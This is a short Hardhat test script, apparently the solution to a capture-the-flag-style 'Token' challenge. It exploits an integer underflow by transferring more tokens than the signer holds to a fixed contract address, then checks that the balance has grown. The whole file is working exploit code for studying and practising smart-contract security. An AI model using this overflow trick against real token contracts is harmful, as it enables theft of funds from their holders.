import { TransactionResponse } from "@ethersproject/providers";
import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

describe("Token", function () {
  it("Pwn", async function () {
    const ABI = [
      "function balanceOf(address) view returns (uint256)",
      "function transfer(address, uint256) returns (bool)",
    ];
    const ADDRESS = "0x34B36D7212f38Db4d5f42fAC9f7b031825D1af07";
    const contract = await ethers.getContractAt(ABI, ADDRESS);
    const [signer] = await ethers.getSigners();

    const initialBalance: BigNumber = await contract.balanceOf(signer.address);
    console.log(`balanceOf(): ${initialBalance}`);
    console.log("Transferring...");
    const tx: TransactionResponse = await contract.transfer(ADDRESS, initialBalance.add(1));
    await tx.wait();
    const pwnedBalance: BigNumber = await contract.balanceOf(signer.address);
    console.log(`balanceOf(): ${pwnedBalance}`);
    expect(pwnedBalance).to.be.above(initialBalance);
  });
});
